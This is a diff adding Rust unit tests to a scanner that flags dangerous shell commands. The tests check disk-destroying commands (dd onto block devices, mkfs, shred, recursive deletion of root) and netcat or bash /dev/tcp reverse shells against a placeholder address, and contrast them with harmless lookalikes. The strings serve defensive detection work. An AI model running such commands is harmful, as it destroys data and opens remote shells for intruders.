@@ -567,6 +567,139 @@ mod tests {
             .any(|m| m.identifier == "destructive_kubectl_delete_all"));
     }
 
+    fn hits(cmd: &str, rule: &str) -> bool {
+        scan(cmd).matches.iter().any(|m| m.identifier == rule)
+    }
+
+    #[test]
+    fn silenced_output_is_not_a_destructive_redirect() {
+        for cmd in [
+            "cargo build >/dev/null 2>&1",
+            "command -v jq > /dev/null 2>&1 || exit 1",
+        ] {
+            assert!(
+                !hits(cmd, "destructive_dev_null_redirect"),
+                "{cmd:?} only discards output"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_disk_device_writes() {
+        for dev in [
+            "/dev/sda",
+            "/dev/nvme0n1",
+            "/dev/disk2",
+            "/dev/rdisk3",
+            "/dev/mmcblk0",
+        ] {
+            for cmd in [
+                format!("dd if=/dev/zero of={dev}"),
+                format!("dd of={dev} if=/dev/zero bs=4M"),
+                format!("echo x > {dev}"),
+            ] {
+                assert!(
+                    hits(&cmd, "destructive_filesystem_disk"),
+                    "expected destructive_filesystem_disk for {cmd:?}"
+                );
+            }
+        }
+        for cmd in [
+            "dd if=/dev/zero of=$DISK",
+            "mkfs.ext4 /dev/sda1",
+            "shred -n 3 -z /dev/sda",
+            "chmod -R 777 /",
+        ] {
+            assert!(
+                hits(cmd, "destructive_filesystem_disk"),
+                "expected destructive_filesystem_disk for {cmd:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_recursive_delete_of_root() {
+        for prefix in ["", "sudo "] {
+            for args in [
+                "-rf /",
+                "-fr /",
+                "-Rf /",
+                "-rf /*",
+                "--recursive --force /",
+                "-rf --no-preserve-root /",
+            ] {
+                let cmd = format!("{prefix}rm {args}");
+                assert!(
+                    hits(&cmd, "destructive_filesystem_disk"),
+                    "expected destructive_filesystem_disk for {cmd:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn routine_dd_and_rm_are_not_disk_destruction() {
+        for cmd in [
+            "dd if=/dev/zero of=/dev/null count=1",
+            "dd if=/dev/zero of=out.bin bs=1M count=10",
+            "dd if=/dev/sda of=backup.img",
+            "rm -rf /tmp/build",
+            "rm -rf /var/lib/apt/lists/x",
+            "rm -rf node_modules ./dist",
+        ] {
+            assert!(
+                !hits(cmd, "destructive_filesystem_disk"),
+                "unexpected destructive_filesystem_disk for {cmd:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_netcat_shells_in_any_flag_order() {
+        let target = "192.0.2.10 4444";
+        for prog in ["nc", "ncat", "netcat"] {
+            for prefix in ["", "sudo ", "nohup "] {
+                for cmd in [
+                    format!("{prefix}{prog} -e /bin/sh {target}"),
+                    format!("{prefix}{prog} {target} -e /bin/sh"),
+                    format!("{prefix}{prog} -c /bin/bash {target}"),
+                    format!("{prefix}{prog} --sh-exec /bin/sh {target}"),
+                    format!("{prefix}{prog} -l -p 4444"),
+                    format!("{prefix}{prog} -nvlp 4444"),
+                    format!("{prefix}{prog} -p 4444 -l"),
+                ] {
+                    assert!(
+                        hits(&cmd, "command_injection_reverse_shell"),
+                        "expected command_injection_reverse_shell for {cmd:?}"
+                    );
+                }
+            }
+        }
+        assert!(hits(
+            "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1",
+            "command_injection_reverse_shell"
+        ));
+    }
+
+    #[test]
+    fn netcat_lookalikes_are_not_reverse_shells() {
+        for cmd in [
+            "nc -z 127.0.0.1 22",
+            "nc -vz -G 5 example.com 22",
+            "nc -l 127.0.0.1 14319",
+            "rsync -av --exclude '.env' src/ dst/",
+            "scutil --nc list",
+            "jq -nc '{a: 1}'",
+            "grep -nc pattern file.txt",
+            "cargo bench --bench parse",
+        ] {
+            assert!(
+                !hits(cmd, "command_injection_reverse_shell"),
+                "unexpected command_injection_reverse_shell for {cmd:?}"
+            );
+        }
+    }
+
     // --- Supply chain rules ---
 
     #[test]
